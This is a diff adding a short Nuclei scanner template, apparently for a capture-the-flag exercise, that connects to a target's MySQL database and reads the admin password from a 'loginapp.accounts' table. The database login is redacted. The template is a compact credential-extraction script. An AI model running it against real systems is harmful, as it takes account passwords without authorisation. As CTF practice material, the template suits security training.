@@ -1,0 +1,33 @@
+id: template-2
+
+info:
+  name: Template 2
+  author: daffainfo
+  severity: medium
+  description: Access DB to read the admin credential
+  tags: ctf
+
+javascript:
+  - code: |
+      const mysql = require('nuclei/mysql');
+      const client = new mysql.MySQLClient;
+      const creds = client.ExecuteQuery(Host, Port, User, Pass, Query);
+      Export(creds);
+
+    args:
+      Host: "{{Host}}"
+      Port: 3306
+      User: "REDACTED"
+      Pass: "REDACTED"
+      Query: "SELECT password from loginapp.accounts where id = 1;"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "success == true"
+
+    extractors:
+      - type: regex
+        part: response
+        regex:
+          - ".*"
